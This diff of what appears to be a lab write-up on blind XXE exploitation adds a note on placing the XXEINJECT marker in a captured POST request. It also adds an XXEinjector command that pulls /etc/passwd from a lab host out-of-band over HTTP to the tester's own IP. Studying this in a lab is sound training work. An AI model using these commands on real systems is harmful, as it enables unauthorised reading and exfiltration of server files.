@@ -38,7 +38,7 @@ Tool: XXEinjector
 git clone https://github.com/enjoiz/XXEinjector
 ```
 
-All we need to do is send this request:
+All we need to do is send this request, with XXEINJECT after xml version:
 ```xml
 POST /blind/submitDetails.php HTTP/1.1
 Host: 10.129.201.94
@@ -54,4 +54,9 @@ Connection: close
 
 <?xml version="1.0" encoding="UTF-8"?>
 XXEINJECT
+```
+
+```shell-session
+ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
+cat Logs/10.129.201.94/etc/passwd.log 
 ```
